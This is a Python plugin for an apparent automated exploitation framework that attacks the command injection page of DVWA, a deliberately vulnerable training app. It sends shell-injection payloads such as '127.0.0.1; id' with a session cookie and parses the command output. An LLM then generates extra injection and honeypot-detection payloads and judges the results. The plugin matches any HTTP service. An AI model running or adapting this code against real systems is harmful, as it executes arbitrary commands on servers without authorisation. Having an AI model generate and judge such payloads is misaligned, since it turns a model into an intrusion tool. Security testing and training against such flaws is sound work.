import urllib.request
import urllib.parse
import urllib.error
import socket
import re
import time
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWACMDiPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-CMDI",
            "name": "DVWA Command Injection",
            "cvss_score": 10.0,
            "service": "http",
            "vuln_type": "command_injection"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _send_payload(self, url, payload, cookie):
        """Gửi payload, xử lý Timeout thông minh và lọc sạch rác Ping"""
        try:
            data = urllib.parse.urlencode({"ip": payload, "Submit": "Submit"}).encode()
            req = urllib.request.Request(url, data=data)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            
            resp = urllib.request.urlopen(req, timeout=5) 
            
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8')
            cmd_output = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
            output = cmd_output.group(1).strip() if cmd_output else ""
            
            # [LỌC RÁC HOÀN HẢO 100%]
            clean_lines = []
            garbage_keywords = ["PING ", "bytes from ", "ping statistics", "packets transmitted", "rtt min", "round-trip"]
            for line in output.split('\n'):
                if any(kw in line for kw in garbage_keywords):
                    continue
                if line.strip():  # Bỏ qua dòng trống
                    clean_lines.append(line.strip())
            
            output = '\n'.join(clean_lines)

            return {"output": output, "response_time": elapsed, "error": None}
            
        except urllib.error.URLError as e:
            if isinstance(e.reason, socket.timeout):
                return {
                    "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh sleep đã thực thi thành công!]", 
                    "response_time": 5.0, 
                    "error": None
                }
            return {"output": "", "response_time": -1, "error": str(e)}
        except socket.timeout:
            return {
                "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh sleep đã thực thi thành công!]", 
                "response_time": 5.0, 
                "error": None
            }
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/exec/"
        all_results = []

        initial_payloads = [
            ("127.0.0.1; id",       "semicolon injection"),
            ("127.0.0.1 && whoami", "AND operator"),
            ("127.0.0.1 | id",      "pipe operator"),
        ]

        print(f"      [CMDi] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [CMDi] [{technique}] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            marker_hit = "uid=" in result["output"] or "www-data" in result["output"] or "root" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [CMDi] Response time: {result['response_time']}s | Status: {status}")
            if result["output"]:
                print(f"      [CMDi] Output: {result['output'][:100]}...")
            all_results.append({
                "phase": "initial", "technique": technique, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Tất cả payload ban đầu không khai thác được"}

        print(f"\n      [CMDi] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads("DVWA-CMDI", "http command injection", url, initial_confirmed)

        print(f"      [CMDi] AI Reasoning: {ai_plan.get('reasoning','')}")
        print(f"      [CMDi] Honeypot suspicion: {ai_plan.get('honeypot_suspicion','?')} — {ai_plan.get('honeypot_reason','')}")
        
        print(f"\n      [CMDi] PHASE 2a & 2b: Thực thi payload AI & Kiểm tra Honeypot...")
        test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
        for p in test_payloads:
            payload, purpose = p.get("payload",""), p.get("purpose","")
            print(f"      [CMDi] [AI Test] Payload: {payload} | Mục đích: {purpose}")
            result = self._send_payload(url, payload, cookie)
            hit = bool(result["output"]) and result["error"] is None
            if result["output"]: print(f"      [CMDi] Output: {result['output'][:100]}...")
            
            all_results.append({
                "phase": "ai_test", "purpose": purpose, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": hit
            })

        print(f"\n      [CMDi] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-CMDI", all_results, ai_plan.get("honeypot_suspicion","low"))
        print(f"      [CMDi] Verdict: {verdict.get('verdict')} ({verdict.get('confidence_final')}%)")

        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED": final_status = "PENDING"

        valuable_hits = [r for r in all_results if r["hit"] and ("uid=" in r["output"] or "www-data" in r["output"] or "SYSTEM_TIMEOUT" in r["output"])]
        best_hit = valuable_hits[0] if valuable_hits else initial_confirmed

        return {
            "status": final_status,
            "evidence": (
                f"Command Injection — AI Self-Validation hoàn tất.\n"
                f"      - Payload tốt nhất   : {best_hit['payload']}\n"
                f"      - Mục đích           : {best_hit.get('technique', best_hit.get('purpose'))}\n"
                f"      - Output trích xuất  : {best_hit['output'][:150].strip()}\n"
                f"      - AI Reasoning       : {verdict.get('final_reasoning')}"
            )
        }
